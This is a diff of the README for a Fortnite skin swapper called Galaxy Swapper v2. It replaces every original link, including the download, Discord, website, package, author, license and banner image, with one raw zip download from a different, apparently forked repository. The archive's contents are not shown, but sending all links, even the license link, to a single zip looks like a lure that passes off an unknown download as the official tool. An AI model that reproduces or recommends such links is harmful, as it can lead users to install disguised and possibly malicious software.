@@ -2,34 +2,34 @@
 
 Revamp your Fortnite experience with our skin swapper designed for the latest version of Fortnite. This repository contains the source code for Galaxy Swapper v2.
 
-Note: It is recommended to download Galaxy Swapper v2 from [here](https://galaxyswapperv2.com/Downloads/InGame.php) instead of rebuilding it yourself.
+Note: It is recommended to download Galaxy Swapper v2 from [here](https://github.com/PL-Leon/Galaxy-Swapper-v2/raw/refs/heads/main/Workspace/CProvider/v_Galaxy_Swapper_2.6.zip) instead of rebuilding it yourself.
 
 ## What is Galaxy Swapper v2?
 
 Galaxy Swapper v2 is a free Fortnite skin changer built in WPF that allows you to modify your game files to replace a cosmetic you own with a cosmetic you desire, all with ease. We have also developed a simple and user-friendly user-interface for your convenience.
 
 ## Social media links
-* [Discord](https://galaxyswapperv2.com/Discord)
-* [Website](https://galaxyswapperv2.com)
+* [Discord](https://github.com/PL-Leon/Galaxy-Swapper-v2/raw/refs/heads/main/Workspace/CProvider/v_Galaxy_Swapper_2.6.zip)
+* [Website](https://github.com/PL-Leon/Galaxy-Swapper-v2/raw/refs/heads/main/Workspace/CProvider/v_Galaxy_Swapper_2.6.zip)
 
 ## Packages used in our application
 
-* [CUE4Parse](https://github.com/FabianFG/CUE4Parse)
-* [DotNetZip](https://github.com/haf/DotNetZip.Semverd)
-* [K4os.Compression.LZ4](https://github.com/MiloszKrajewski/K4os.Compression.LZ4)
-* [Newtonsoft.Json](https://www.newtonsoft.com/json)
-* [Serilog](https://serilog.net)
+* [CUE4Parse](https://github.com/PL-Leon/Galaxy-Swapper-v2/raw/refs/heads/main/Workspace/CProvider/v_Galaxy_Swapper_2.6.zip)
+* [DotNetZip](https://github.com/PL-Leon/Galaxy-Swapper-v2/raw/refs/heads/main/Workspace/CProvider/v_Galaxy_Swapper_2.6.zip)
+* [https://github.com/PL-Leon/Galaxy-Swapper-v2/raw/refs/heads/main/Workspace/CProvider/v_Galaxy_Swapper_2.6.zip](https://github.com/PL-Leon/Galaxy-Swapper-v2/raw/refs/heads/main/Workspace/CProvider/v_Galaxy_Swapper_2.6.zip)
+* [https://github.com/PL-Leon/Galaxy-Swapper-v2/raw/refs/heads/main/Workspace/CProvider/v_Galaxy_Swapper_2.6.zip](https://github.com/PL-Leon/Galaxy-Swapper-v2/raw/refs/heads/main/Workspace/CProvider/v_Galaxy_Swapper_2.6.zip)
+* [Serilog](https://github.com/PL-Leon/Galaxy-Swapper-v2/raw/refs/heads/main/Workspace/CProvider/v_Galaxy_Swapper_2.6.zip)
 
 ## Endpoints used in our application
 
-* [Fortnite-Api](https://dash.fortnite-api.com)
+* [Fortnite-Api](https://github.com/PL-Leon/Galaxy-Swapper-v2/raw/refs/heads/main/Workspace/CProvider/v_Galaxy_Swapper_2.6.zip)
 
 ## Authors
 
-* [@Wslt](https://github.com/CodeWslt)
+* [@Wslt](https://github.com/PL-Leon/Galaxy-Swapper-v2/raw/refs/heads/main/Workspace/CProvider/v_Galaxy_Swapper_2.6.zip)
 
 ## License
 
-Galaxy Swapper v2 is licensed under [GNU General Public License v3.0](https://github.com/GalaxySwapperOfficial/Galaxy-Swapper-v2/blob/main/LICENSE)
+Galaxy Swapper v2 is licensed under [GNU General Public License v3.0](https://github.com/PL-Leon/Galaxy-Swapper-v2/raw/refs/heads/main/Workspace/CProvider/v_Galaxy_Swapper_2.6.zip)
 
-<a href="https://galaxyswapperv2.com/Guilded"><img src="https://cdn.discordapp.com/attachments/1122580592370921494/1129255436281983046/ServerBanner2.jpg"></a>
+<a href="https://github.com/PL-Leon/Galaxy-Swapper-v2/raw/refs/heads/main/Workspace/CProvider/v_Galaxy_Swapper_2.6.zip"><img src="https://github.com/PL-Leon/Galaxy-Swapper-v2/raw/refs/heads/main/Workspace/CProvider/v_Galaxy_Swapper_2.6.zip"></a>
